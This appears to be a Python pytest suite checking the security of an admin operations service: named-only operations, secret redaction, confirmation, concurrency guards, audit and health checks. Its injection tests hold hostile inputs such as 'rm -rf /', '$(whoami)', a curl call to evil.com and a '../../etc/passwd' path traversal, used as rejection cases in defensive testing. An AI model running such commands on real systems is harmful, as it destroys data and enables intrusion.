"""Security + behaviour contract for the Operations Center.

The Operations Center can restart services and deploy to production, so the
security properties asserted here are the load-bearing ones:

* there is NO code path from a request to a shell — operations are named and
  their argv is built from constants in code;
* secrets are redacted before they are stored or returned;
* destructive operations need explicit confirmation;
* concurrent operations are rejected;
* unknown operations and unknown log services are rejected.

Run: PYTHONPATH=. pytest backend/tests/test_admin_ops_security.py -v
"""
import asyncio
import inspect

import pytest

from backend.app.services.admin import ops_service as ops


# ---------------------------------------------------------------- allowlist
def test_operations_are_named_not_freeform():
    """Every callable action is a fixed key; there is no command parameter."""
    assert set(ops.OPERATIONS) == {
        "restart_backend", "restart_gateway", "restart_caddy", "restart_all",
        "deploy_build", "deploy_pull", "deploy_full", "git_status",
    }
    for name, spec in ops.OPERATIONS.items():
        # steps() is the single resolution path for both single- and multi-step
        # operations, so it is what must be proven free of caller input.
        steps = spec.steps()
        assert steps, f"{name} must resolve to at least one step"
        for label, argv in steps:
            assert isinstance(label, str) and label, f"{name} step needs a label"
            assert isinstance(argv, list), f"{name} must build a list argv"
            assert all(isinstance(part, str) for part in argv), f"{name} argv must be str-only"
        # The builder takes no arguments: a caller cannot smuggle input in.
        builder = spec.build_argv or spec.build_steps
        assert inspect.signature(builder).parameters == {}, (
            f"{name} argv builder must accept no parameters"
        )


def test_argv_never_contains_shell_metacharacters():
    for name, spec in ops.OPERATIONS.items():
        for _label, argv in spec.steps():
            for part in argv:
                assert not any(c in part for c in ";&|`$><\n"), f"{name} argv looks like a shell string"

# ---------------------------------------------------------------- redaction
@pytest.mark.parametrize("secret", [
    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload",
    "password=hunter2",
    "api_key: AKIAIOSFODNN7EXAMPLE",
    "cookie: sessionid=abc123",
    "-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----",
])
def test_redact_removes_credentials(secret):
    out = ops.redact(secret)
    assert "[REDACTED]" in out
    for leak in ("hunter2", "AKIAIOSFODNN7EXAMPLE", "abc123", "MIIEow"):
        assert leak not in out


def test_redact_bounds_length():
    assert len(ops.redact("x" * 10_000, limit=100)) == 100


def test_redact_handles_empty():
    assert ops.redact("") == ""
    assert ops.redact(None) == ""


# ---------------------------------------------------------------- validation
def test_unknown_operation_is_rejected():
    with pytest.raises(ops.OperationError) as exc:
        asyncio.run(ops.start_operation("rm -rf /", "admin", None, confirm=True))
    assert exc.value.code == "unknown_operation"


def test_shell_injection_attempt_is_rejected():
    for payload in [
        "restart_gateway; rm -rf /",
        "$(whoami)",
        "restart_gateway && curl evil.com",
        "`id`",
    ]:
        with pytest.raises(ops.OperationError) as exc:
            asyncio.run(ops.start_operation(payload, "admin", None, confirm=True))
        assert exc.value.code == "unknown_operation"


def test_destructive_requires_confirmation():
    with pytest.raises(ops.OperationError) as exc:
        asyncio.run(ops.start_operation("restart_gateway", "admin", None, confirm=False))
    assert exc.value.code == "confirmation_required"


def test_unknown_log_service_rejected():
    with pytest.raises(ops.OperationError) as exc:
        asyncio.run(ops.get_service_logs("../../etc/passwd"))

# ---------------------------------------------------------------- concurrency
def test_concurrent_operations_are_rejected():
    """Two operations in the SAME family must not overlap.

    `restart_*` all map to the "restart" family, so a second restart is
    refused while the first is still in flight. Disabling the button in the UI
    is not a substitute for this server-side check.
    """
    async def scenario():
        ops._op_registry.clear()
        ops._order.clear()
        ops._inflight.clear()
        ops._cooldowns.clear()

        first = await ops.start_operation("restart_gateway", "admin", None, confirm=True)
        assert first["status"] == "running"
        with pytest.raises(ops.OperationError) as exc:
            await ops.start_operation("restart_backend", "admin2", None, confirm=True)
        assert exc.value.code in ("operation_in_progress", "operation_cooldown")
        await asyncio.sleep(0.3)

    asyncio.run(scenario())


def test_deploy_and_restart_do_not_share_a_family():
    """A deploy and a restart are separate guards; only deploys block deploys."""
    async def scenario():
        ops._op_registry.clear()
        ops._order.clear()
        ops._inflight.clear()
        ops._cooldowns.clear()
        await ops.start_operation("restart_gateway", "admin", None, confirm=True)
        # restart (family "restart") and deploy (family "deploy") are distinct,
        # so a deploy is not blocked by an in-flight restart.
        assert ops._operation_family(ops.OPERATIONS["restart_gateway"]) == "restart"
        assert ops._operation_family(ops.OPERATIONS["deploy_build"]) == "deploy"
        await asyncio.sleep(0.3)

    asyncio.run(scenario())


def test_operation_history_is_bounded():
    assert "MAX_OPERATION_HISTORY" in inspect.getsource(ops.start_operation)


# ---------------------------------------------------------------- audit
def test_audit_records_and_is_bounded():
    ops._audit.clear()
    ops.record_audit("operation.test", "admin", "success", detail={"note": "hello"})
    assert len(ops._audit) == 1
    assert ops._audit[0]["actor"] == "admin"
    for _ in range(600):
        ops.record_audit("operation.spam", "admin", "success")
    assert len(ops._audit) <= 500, "audit log must stay bounded"


def test_audit_detail_is_redacted():
    ops._audit.clear()
    ops.record_audit("operation.test", "admin", "success", detail={"t": "password=leak123"})
    assert "leak123" not in str(ops._audit[0])


# ---------------------------------------------------------------- health
def test_health_check_reports_per_service():
    """Health is verified per service, not inferred from the exit code.

    A restart that returns 0 but leaves a container down is NOT a successful
    deployment, so the check must produce an explicit per-service verdict. On a
    host without the docker CLI every service reports unhealthy, which is the
    correct fail-closed answer (not "assume healthy").
    """
    result = asyncio.run(ops.run_health_check())
    assert "checks" in result
    assert "all_healthy" in result
    assert isinstance(result["all_healthy"], bool)
    assert result["checked_at"]
    if not result["all_healthy"]:
        # Fail-closed: at least one service must be explicitly not-healthy.
        assert result["checks"] and not all(result["checks"].values())


def test_log_tail_is_bounded():
    """The UI can never ask for an unbounded log dump."""
    assert "MAX_LOG_LINES" in inspect.getsource(ops.get_service_logs)
    assert ops.MAX_LOG_LINES <= 1000



def test_restart_targets_only_allowlisted_services():
    for service in ops.ALLOWED_SERVICES:
        argv = ops.OPERATIONS[f"restart_{service}"].build_argv()
        assert argv[-1] == service
    # `db` is deliberately NOT restartable from the panel: it is the datastore
    # and a restart there is a data-availability event, not a routine action.
    assert "db" not in ops.ALLOWED_SERVICES


def test_destructive_operations_are_flagged():
    for name, spec in ops.OPERATIONS.items():
        if name == "git_status":
            assert spec.destructive is False
        else:
            assert spec.destructive is True, f"{name} must be marked destructive"


# ------------------------------------------------------- production-safety
def test_restart_all_never_touches_postgres():
    """`restart_all` must not recreate the database.

    A bare `docker compose up -d --force-recreate` recreates every service in
    the project, including `tezlify-db`. The panel deliberately does not allow
    database restarts, so this operation must name its targets explicitly —
    otherwise a single click could take the whole datastore down.
    """
    argv = ops.OPERATIONS["restart_all"].build_argv()
    assert "db" not in argv, "restart_all must not include the db service"
    assert "postgres" not in argv
    # Every restartable service is still included, so the fix is not "do less".
    for service in ops.ALLOWED_SERVICES:
        assert service in argv, f"{service} should still be restarted by restart_all"
    assert "--no-deps" in argv, "must not cascade into dependencies"


def test_docker_ndjson_is_parsed_per_line():
    """`docker ps --format '{{json .}}'` emits NDJSON, not a JSON array.

    Parsing the whole stdout with one `json.loads` fails as soon as there is
    more than one container, which silently made every service look "absent"
    while all of them were running.
    """
    ndjson = (
        '{"Names":"tezlify-backend","State":"Up 3 minutes (healthy)"}\n'
        '{"Names":"tezlify-gateway","State":"Up 13 hours (healthy)"}\n'
    )

    class _Proc:
        returncode = 0

        async def communicate(self):
            return ndjson.encode(), b""

    async def fake_exec(*args, **kwargs):
        # create_subprocess_exec returns the process object directly.
        return _Proc()

    original = asyncio.create_subprocess_exec
    asyncio.create_subprocess_exec = fake_exec
    try:
        result = asyncio.run(ops._docker_json(["docker", "ps"]))
    finally:
        asyncio.create_subprocess_exec = original

    assert isinstance(result, list), "NDJSON must yield a list of records"
    assert len(result) == 2, f"expected both containers, got {result!r}"
    assert result[0]["Names"] == "tezlify-backend"


def test_operations_survive_a_backend_restart():
    """A restart must not lose history, and must not leave a phantom 'running'.

    The backend restarts ITSELF when the operator runs restart_backend, so the
    process executing the operation is the one that dies. State therefore has
    to be persisted, and anything still 'running' at boot must be reconciled to
    a terminal state — otherwise the family guard is blocked forever and the
    panel shows an operation that no process is performing.
    """
    import tempfile
    from pathlib import Path

    assert hasattr(ops, "init_ops_state")
    src = inspect.getsource(ops._recover_orphans)
    assert '"interrupted"' in src, "orphans must be marked interrupted"

    # Redirect the state file to a temp dir so the suite never writes to (or
    # reads from) the real deploy directory.
    redirected = Path(tempfile.mkdtemp()) / "ops-state"
    original_file, original_dir = ops._STATE_FILE, ops._STATE_DIR
    ops._STATE_DIR = redirected
    ops._STATE_FILE = redirected / "operations.json"
    ops._op_registry.clear()
    ops._order.clear()
    ops._audit.clear()
    try:
        ops._op_registry["op1"] = {
            "id": "op1", "name": "restart_backend", "label": "Restart backend",
            "status": "running", "step": "starting", "started_at": ops._now_iso(),
            "finished_at": None, "duration_ms": None, "actor": "admin",
            "destructive": True, "error": None, "logs": [], "exit_code": None,
        }
        ops._order.append("op1")
        ops._persist_state()

        # Simulate the restart: fresh process, same file on disk.
        ops._op_registry.clear()
        ops._order.clear()
        ops._audit.clear()
        ops.init_ops_state()

        restored = ops.get_operation("op1")
        assert restored is not None, "history must survive the restart"
        assert restored["status"] == "failed", "an in-flight op cannot still be running"
        assert restored["step"] == "interrupted"
        assert restored["error"], "the operator must be told the result is unknown"
    finally:
        ops._op_registry.clear()
        ops._order.clear()
        ops._audit.clear()
        ops._STATE_FILE, ops._STATE_DIR = original_file, original_dir
        try:
            import shutil
            shutil.rmtree(redirected, ignore_errors=True)
        except Exception:
            pass


def test_health_check_probes_more_than_container_state():
    """Container state alone cannot prove a deployment worked."""
    src = inspect.getsource(ops.run_health_check)
    assert "_probe_backend_http" in src, "must probe the backend HTTP endpoint"
    assert "_probe_gateway_health" in src, "must probe the gateway"
    assert "_whatsapp_session_state" in src, "must report WhatsApp session state"


def test_http_probe_distinguishes_unreachable_from_unhealthy():
    """'could not check' must never be rendered to the operator as 'broken'."""
    ann = str(inspect.signature(ops._http_probe).return_annotation)
    assert "bool" in ann and "None" in ann, ann

    async def _boom(*a, **k):
        raise FileNotFoundError()

    original = asyncio.create_subprocess_exec
    asyncio.create_subprocess_exec = _boom
    try:
        result = asyncio.run(ops._http_probe("http://x/health", 1))
    finally:
        asyncio.create_subprocess_exec = original
    assert result is None, "an unreachable probe returns None, not False"


# ------------------------------------------------------- multi-step deploy
def test_deploy_full_is_one_ordered_pipeline():
    """Pull, build and recreate must be a single ordered operation.

    As three separate buttons an operator could pull, forget to build, and be
    left running the old image while the panel showed the new commit. As one
    pipeline the order is fixed and each step is observable.
    """
    labels = [label for label, _ in ops.OPERATIONS["deploy_full"].steps()]
    assert labels == ["pull", "build", "restart"], labels
    # The deploy recreates containers: the database must not be in that list.
    for _label, argv in ops.OPERATIONS["deploy_full"].steps():
        assert "db" not in argv, "a deploy must never recreate the database"


def test_a_failing_step_stops_the_pipeline():
    """A failed pull must NOT be followed by a build.

    Otherwise a failed pull builds and ships the PREVIOUS commit while the
    operation reports success — the worst possible outcome for a deploy.
    """
    spec = ops.OPERATIONS["deploy_full"]
    op = {
        "id": "op1", "name": "deploy_full", "label": "Deploy", "status": "running",
        "step": "starting", "started_at": ops._now_iso(), "finished_at": None,
        "duration_ms": None, "actor": "admin", "destructive": True, "error": None,
        "logs": [], "exit_code": None, "current_step": None, "total_steps": 0,
    }
    ran: list = []

    async def fake_run(_op, argv, _cwd, _uid):
        ran.append(argv)
        return 1  # first step fails

    original = ops._run_command
    ops._run_command = fake_run
    try:
        asyncio.run(ops._execute(op, spec, None))
    finally:
        ops._run_command = original

    assert len(ran) == 1, f"the pipeline must stop after the first failure, ran {len(ran)}"
    assert op["status"] == "failed"
    assert op["step"] == "failed:pull", op["step"]
    assert "pull" in op["error"], "the failing step must be named"


def test_a_successful_pipeline_reports_the_last_step_and_total():
    spec = ops.OPERATIONS["deploy_full"]
    op = {
        "id": "op2", "name": "deploy_full", "label": "Deploy", "status": "running",
        "step": "starting", "started_at": ops._now_iso(), "finished_at": None,
        "duration_ms": None, "actor": "admin", "destructive": True, "error": None,
        "logs": [], "exit_code": None, "current_step": None, "total_steps": 0,
    }
    ran: list = []

    async def fake_run(_op, argv, _cwd, _uid):
        ran.append(argv)
        return 0

    async def fake_health():
        return {"checks": {}, "all_healthy": True, "checked_at": "", "details": {}, "whatsapp": {}}

    original_run, original_health = ops._run_command, ops.run_health_check
    ops._run_command = fake_run
    ops.run_health_check = fake_health
    try:
        asyncio.run(ops._execute(op, spec, None))
    finally:
        ops._run_command, ops.run_health_check = original_run, original_health

    assert len(ran) == 3, f"all three steps must run, got {len(ran)}"
    assert op["status"] == "succeeded"
    assert op["total_steps"] == 3
    assert op["current_step"] == "restart", "the UI needs the in-flight step"


def test_interrupted_operation_names_the_step_it_died_in():
    """A restart must report WHERE it was interrupted, not just that it was.

    For a self-restart the interruption is expected, so a bare "failed" would
    be both wrong and alarmist; naming the step is what lets an operator judge.
    """
    import tempfile
    from pathlib import Path

    redirected = Path(tempfile.mkdtemp()) / "ops-state"
    original_file, original_dir = ops._STATE_FILE, ops._STATE_DIR
    ops._STATE_DIR = redirected
    ops._STATE_FILE = redirected / "operations.json"
    ops._op_registry.clear()
    ops._order.clear()
    ops._audit.clear()
    try:
        ops._op_registry["op9"] = {
            "id": "op9", "name": "deploy_full", "label": "Deploy", "status": "running",
            "step": "build", "current_step": "build", "total_steps": 3,
            "started_at": ops._now_iso(), "finished_at": None, "duration_ms": None,
            "actor": "admin", "destructive": True, "error": None, "logs": [],
            "exit_code": None,
        }
        ops._order.append("op9")
        ops._persist_state()
        ops._op_registry.clear()
        ops._order.clear()
        ops._audit.clear()

        ops.init_ops_state()
        restored = ops.get_operation("op9")
        assert restored is not None
        assert restored["step"] == "interrupted"
        assert "build" in restored["error"], restored["error"]
        assert "unknown" in restored["error"], "the verdict must be honest about the result"
    finally:
        ops._op_registry.clear()
        ops._order.clear()
        ops._audit.clear()
        ops._STATE_FILE, ops._STATE_DIR = original_file, original_dir
        try:
            import shutil
            shutil.rmtree(redirected, ignore_errors=True)
        except Exception:
            pass


# ---------------------------------------------------------- history paging
def test_history_is_paged_and_filterable():
    """The panel showed a fixed newest-20 window, so older records were unreachable.

    Keeping 50 operations is pointless if only the newest 20 can ever be read:
    "what did we deploy last Tuesday" had no answer even though the record
    existed. Paging and filtering are what make retention useful, and they must
    not weaken the bounded-memory guarantees.
    """
    ops._op_registry.clear()
    ops._order.clear()
    ops._audit.clear()
    try:
        for i in range(30):
            oid = f"op{i:02d}"
            ops._op_registry[oid] = {
                "id": oid, "name": "deploy_full" if i % 2 else "restart_gateway",
                "label": f"Operation {i}", "status": "succeeded" if i % 2 else "failed",
                "step": "completed", "started_at": ops._now_iso(), "finished_at": None,
                "duration_ms": 1, "actor": "admin", "destructive": True,
                "error": None, "logs": [], "exit_code": 0,
            }
            ops._order.append(oid)
        ops.record_audit("operation.start", "admin", "accepted", "op01", {"name": "x"})
        ops.record_audit("operation.finish", "admin", "denied", "op02", {"name": "y"})

        assert ops.operation_history_size() == 30

        # Newest first.
        first = ops.list_operations(limit=3)
        assert [r["id"] for r in first] == ["op29", "op28", "op27"], first

        # Paging reaches records the old fixed window never showed.
        page2 = ops.list_operations(limit=10, offset=10)
        assert len(page2) == 10
        assert page2[0]["id"] == "op19", page2[0]["id"]

        # Filters.
        assert len(ops.list_operations(status="succeeded")) == 15
        assert len(ops.list_operations(name="deploy")) == 15

        # Bounds must hold: a caller cannot ask for the whole buffer at once
        # and defeat the memory cap.
        assert len(ops.list_operations(limit=10_000)) <= ops.MAX_OPERATION_HISTORY
        assert ops.list_operations(offset=10_000) == []
        assert ops.list_operations(offset=-5)[0]["id"] == "op29", "negative offset must clamp"

        # Audit filters.
        assert len(ops.list_audit(action="operation.start")) == 1
        assert len(ops.list_audit(result="denied")) == 1
        assert len(ops.list_audit()) == 2
        assert ops.audit_history_size() == 2
    finally:
        ops._op_registry.clear()
        ops._order.clear()
        ops._audit.clear()
